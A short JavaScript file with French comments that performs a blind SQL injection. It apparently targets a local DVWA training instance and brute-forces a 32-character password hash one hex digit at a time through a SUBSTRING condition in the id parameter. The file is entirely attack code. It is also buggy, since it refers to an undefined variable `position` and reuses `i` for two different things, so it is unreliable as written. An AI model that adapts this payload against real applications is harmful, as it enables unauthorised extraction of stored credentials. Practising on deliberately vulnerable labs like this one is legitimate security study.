let lettersPwd = [];

function injection(){
     let i = 'abcdef0123456789';
     i.split('').forEach((letter)=> {
        for(i=1; i<=32;i++) testLetter(letter, i);});
};
function testLetter (letter, i){
    let func = ("SUBSTRING(password" .concat(',',i,',1 ) = ', letter));
    fetch(`http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+${encodeURI(func)}&Submit=Submit#`).then((response) =>{
        if (response.ok) lettersPwd[position-1] = letter;  // On récupère la lettre dans l'array
        if(lettersPwd.join('').length == 32) console.info(`Le mot de passe est :  ${lettersPwd.join('')}`);
    });
}

injection();

